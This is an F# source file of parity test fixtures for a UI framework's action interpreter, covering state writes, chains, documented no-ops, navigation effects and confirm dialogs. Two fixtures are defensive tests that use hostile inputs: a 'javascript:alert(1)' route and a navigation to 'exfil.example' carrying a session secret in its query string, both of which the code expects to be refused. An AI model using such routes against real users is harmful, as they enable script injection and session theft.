module Fuaran.UI.Program.Parity.Seeds

open Fuaran.UI
open Fuaran.UI.Types
open Fuaran.UI.OpStream.Abstractions
open Fuaran.UI.Program.Parity.Runner

// ============================================================================
//  The seed fixtures.
//
//  Coverage is chosen to pin the SHARED semantics, one concern per fixture:
//  the store mutation, composition, the documented no-ops, the closure-free
//  effects, the re-resolution coverage floor, and — the one people forget — the
//  kinds that deliberately DO NOT re-resolve. A pass-through fixtured as a
//  pass-through is what turns "the floor moved" from a silent behaviour change
//  into a failing test.
// ============================================================================

let private jstr (s: string) = Fuaran.Core.JStr s

let private bound (id: string) (key: string) (dflt: string) : Node<obj> =
    let n = Fuaran.markdown id "placeholder"

    { n with
        Kind = NodeKind.Markdown({ Text = TextSource.Bound(Binding.State(key, Some dflt)) }) }

let private button (id: string) (action: Action<obj>) : Node<obj> =
    Fuaran.button
        id
        { Defaults.button<obj> with
            Label = TextSource.Literal id
            OnClick = action }

let private dash (children: Node<obj> list) : Node<obj> =
    Fuaran.dashboard
        "root"
        { Defaults.dashboard<obj> with
            Children = children }

let private click (id: string) : ScriptedEvent =
    { NodeId = id
      Event = "click"
      Payload = Map.empty }

let private fixture (name: string) (tree: Node<obj>) (events: ScriptedEvent list) : Fixture =
    { Name = name
      TreeJson = CanonicalJson.encodeNode tree
      Events = events
      Expected = []
      HostPolicy = None }

/// The store mutation, and the re-resolution that makes it visible.
let private setStateRebinds =
    fixture
        "setstate-rebinds"
        (dash
            [ button "set" (Action.SetState("msg", Some(jstr "updated"), None))
              bound "readout" "msg" "init" ])
        [ click "set" ]

/// Composition: a `Chain` folds in order, threading the store. The second write
/// must win, which is what pins "in order" rather than merely "both applied".
let private chainFolds =
    fixture
        "chain-folds"
        (dash
            [ button
                  "set"
                  (Action.Chain
                      [ Action.SetState("msg", Some(jstr "first"), None)
                        Action.SetState("msg", Some(jstr "second"), None) ])
              bound "readout" "msg" "init" ])
        [ click "set" ]

/// Re-resolution is against the FIXED tree the program started from, never the
/// previous step's output (§10.5). Two writes to one key, one per EVENT — which
/// is the only shape that can tell the two readings apart.
///
/// Under the fixed-base reading the readout reads `init`, then `alpha`, then
/// `beta`. Under the fold-your-own-output reading the first step resolves the
/// binding away, so the second event has no binding left to reach and the
/// readout stays `alpha` — a divergence at step 2, on the `tree` member.
///
/// Every one-event scenario beside it passes under BOTH readings, which is why
/// this one exists: the choice is invisible until a second event arrives.
let private fixedBaseReresolution =
    fixture
        "fixed-base-reresolution"
        (dash
            [ button "alpha" (Action.SetState("msg", Some(jstr "alpha"), None))
              button "beta" (Action.SetState("msg", Some(jstr "beta"), None))
              bound "readout" "msg" "init" ])
        [ click "alpha"; click "beta" ]

/// The documented no-ops. Each is inert on the bounded path BY DESIGN, and both
/// placements must be inert in the same way — a placement that quietly grew a
/// `Notify` implementation would diverge here.
let private documentedNoOps =
    fixture
        "documented-no-ops"
        (dash
            [ button "notify" (Action.Notify("channel", jstr "payload"))
              // `Action.dispatch` rather than the `Dispatch` case: the case is
              // marked in-process-only upstream (FS0044), and this is an
              // authoring site — it builds the seed tree. The helper yields
              // the same value and carries the doc comment stating why the
              // payload does not survive a wire boundary, which is exactly the
              // fact this fixture goes on to pin.
              button "dispatch" (Action.dispatch (box "msg" |> Unchecked.nonNull))
              button "call" (Action.Call("/api/thing", None, None))
              bound "readout" "msg" "init" ])
        [ click "notify"; click "dispatch"; click "call" ]

/// The closure-free effects: emitted by both placements, shipped by one and
/// performed by the other. The EFFECT is the shared part; the transport is not.
let private closureFreeEffects =
    fixture
        "closure-free-effects"
        (dash
            [ button "go" (Action.Navigate(TextSource.Literal "/next", NavigateTarget.Self))
              button "copy" (Action.WriteToClipboard(TextSource.Literal "text"))
              bound "readout" "msg" "init" ])
        [ click "go"; click "copy" ]

/// An unsafe route is REFUSED, not silently neutered — and refused identically
/// at both placements, since the sanitiser lives in the shared interpreter.
let private refusedNavigate =
    fixture
        "refused-navigate"
        (dash
            [ button "go" (Action.Navigate(TextSource.Literal "javascript:alert(1)", NavigateTarget.Self))
              bound "readout" "msg" "init" ])
        [ click "go" ]

/// A destination the fold ADMITS and the performer seam declines.
///
/// It is the exact complement of `refused-navigate` beside it, and the pair is
/// what makes each of them mean something. There, the scheme floor refuses the
/// route inside the fold, so no effect is reached at all and every host agrees
/// because the sanitiser is in the shared interpreter. Here the route is
/// perfectly well-formed — `https://` with a real host — so the floor passes it,
/// the fold reaches `Navigate` with the value the program named, and the only
/// thing standing between it and the world is the host's own destination policy.
///
/// **That refusal was invisible to this family until denials existed**, and its
/// invisibility is the whole reason the phase that added them was worth doing:
/// `effects` records what the fold EMITTED, and a host that navigated to the
/// collector produced exactly the same trace as one that declined to. The two
/// events are chosen so the scenario discriminates in both directions — the
/// local route is permitted under the same policy, so a host that simply denies
/// everything fails here too.
///
/// The route carries a query string on purpose. It is what an exfiltration
/// attempt looks like, and the recorded denial naming `exfil.example` and not
/// the query is §5.3's log-safety rule made executable rather than asserted.
let private refusedDestination =
    fixture
        "refused-destination"
        (dash
            [ button "home" (Action.Navigate(TextSource.Literal "/orders", NavigateTarget.Self))
              button
                  "leak"
                  (Action.Navigate(
                      TextSource.Literal "https://exfil.example/collect?session=secret",
                      NavigateTarget.Self
                  ))
              bound "readout" "msg" "init" ])
        [ click "home"; click "leak" ]
    |> fun f ->
        { f with
            HostPolicy = Some "local-egress-only" }

/// The re-resolution coverage FLOOR: the reactive kinds `resolveTree` covers.
/// One state write, several bound fields, all of which must re-resolve.
let private coverageFloorReactive =
    let metric =
        Fuaran.metric
            "metric"
            { Defaults.metric with
                Label = TextSource.Bound(Binding.State("msg", Some "init")) }

    let callout =
        Fuaran.callout
            "callout"
            { Defaults.callout with
                Body = TextSource.Bound(Binding.State("msg", Some "init")) }

    fixture
        "coverage-floor-reactive"
        (dash
            [ button "set" (Action.SetState("msg", Some(jstr "resolved"), None))
              metric
              callout ])
        [ click "set" ]

/// The documented PASS-THROUGHS. `resolveTree`'s floor deliberately does not
/// cover every kind, and this fixture records which — so a later phase that
/// extends the floor changes an expectation on purpose rather than moving
/// behaviour silently. It is a negative result, and the most reusable kind.
let private coverageFloorPassThrough =
    let upload =
        Fuaran.fileUpload
            "upload"
            { Defaults.fileUpload<obj> with
                OnSelect = Some(fun _ -> Action.Chain []) }

    fixture
        "coverage-floor-passthrough"
        (dash
            [ button "set" (Action.SetState("rows", Some(jstr "ignored"), None))
              upload
              bound "readout" "rows" "init" ])
        [ click "set" ]

/// A call action naming a SERVER HANDLER. At the two placements this module's
/// legs drive, the arm is a documented no-op — and that is precisely what this
/// fixture pins, from the server placement's birth: a tree naming a handler must
/// behave identically everywhere a handler cannot run, so the third placement's
/// divergence from the other two is exactly the handler and nothing else.
///
/// The server placement's own suite drives this same triple with a handler
/// registered for the endpoint, which is where the server-effect arms are
/// exercised. Two readings of one fixture: inert here, effectful there.
let private serverHandlerCall =
    fixture
        "server-handler-call"
        (dash
            [ button "refresh" (Action.Call("/handlers/refresh", None, None))
              bound "readout" "rows" "init" ])
        [ click "refresh" ]

/// The same call action, NESTED inside a chain between two writes — the shape
/// the spike's top-level-only recognition could not see (DECISIONS.md D7).
///
/// It earns its place twice over. At the three placements that register no
/// handler it must fold exactly as `chain-folds` does, with the call inert in
/// the middle and both writes landing — so the uniform arm did not change what a
/// call means where nothing answers it. At the server placement with the handler
/// registered, the two writes bracket the handler: the one before it is
/// overwritten by the handler's own, and the one after it survives, which is
/// what "spliced in place" means and what a top-level-only arm could not have
/// produced at all.
let private nestedHandlerCall =
    fixture
        "nested-handler-call"
        (dash
            [ button
                  "refresh"
                  (Action.Chain
                      [ Action.SetState("rows", Some(jstr "before"), None)
                        Action.Call("/handlers/refresh", None, None)
                        Action.SetState("trailing", Some(jstr "after"), None) ])
              bound "readout" "rows" "init"
              bound "tail" "trailing" "init" ])
        [ click "refresh" ]


// ─── Phase 2106: the confirm round trip ──────────────────────────────────────
//
// A confirm is two events on the bounded path: the gesture ASKS (the `Confirm`
// effect, carrying the confirm's address as its token), and the answer — the
// originating event re-delivered with `confirmToken` and `confirmAccepted` —
// runs one continuation. Four scenarios, one per rule: the two answers, a
// question withdrawn by an event that is not its answer, and an answer given
// twice. The last two are where "the answer is correlated" either holds or does
// not, so each ends on an answer the loop must REFUSE.

/// The answer to a pending question: the originating event re-delivered.
let private answer (id: string) (token: string) (accepted: bool) : ScriptedEvent =
    { NodeId = id
      Event = "click"
      Payload =
        Map.ofList
            [ "confirmToken", Fuaran.UI.ServerDriven.Validation.LiveValue.Str token
              "confirmAccepted", Fuaran.UI.ServerDriven.Validation.LiveValue.Bool accepted ] }

/// A confirm guarding a write and a navigation, with a cancel branch.
let private deleteConfirm: Action<obj> =
    Action.Confirm(
        TextSource.Literal "Delete the order?",
        Action.Chain
            [ Action.SetState("msg", Some(jstr "deleted"), None)
              Action.Navigate(TextSource.Literal "/orders", NavigateTarget.Self) ],
        Some(Action.SetState("msg", Some(jstr "kept"), None))
    )

/// Yes runs `onConfirm`, and only on the answer: the gesture itself asks and
/// writes nothing. A confirm that IS the node's action is addressed at the
/// empty path, so its token is the node id and a bare `#`.
let private confirmAnswerYes =
    fixture
        "confirm-answer-yes"
        (dash [ button "delete" deleteConfirm; bound "readout" "msg" "init" ])
        [ click "delete"; answer "delete" "delete#" true ]

/// No runs `onCancel`. The confirm sits second in a chain, so the gesture's
/// first member runs on the ask, and the question's token is its position.
let private confirmAnswerNo =
    fixture
        "confirm-answer-no"
        (dash
            [ button "delete" (Action.Chain [ Action.SetState("msg", Some(jstr "asked"), None); deleteConfirm ])
              bound "readout" "msg" "init" ])
        [ click "delete"; answer "delete" "delete#1" false ]

/// An event that is not the answer WITHDRAWS the question, so the late answer
/// is refused and its continuation never runs — the reader moved on.
let private confirmWithdrawn =
    fixture
        "confirm-withdrawn"
        (dash
            [ button "delete" deleteConfirm
              button "other" (Action.SetState("msg", Some(jstr "other"), None))
              bound "readout" "msg" "init" ])
        [ click "delete"; click "other"; answer "delete" "delete#" true ]

/// An answer CONSUMES its question, so the same answer again is refused: the
/// continuation ran once, and a replayed yes does not run it twice.
let private confirmDuplicateAnswer =
    fixture
        "confirm-duplicate-answer"
        (dash [ button "delete" deleteConfirm; bound "readout" "msg" "init" ])
        [ click "delete"
          answer "delete" "delete#" true
          answer "delete" "delete#" true ]

let all: Fixture list =
    [ setStateRebinds
      chainFolds
      fixedBaseReresolution
      documentedNoOps
      closureFreeEffects
      refusedNavigate
      refusedDestination
      coverageFloorReactive
      coverageFloorPassThrough
      serverHandlerCall
      nestedHandlerCall
      confirmAnswerYes
      confirmAnswerNo
      confirmWithdrawn
      confirmDuplicateAnswer ]
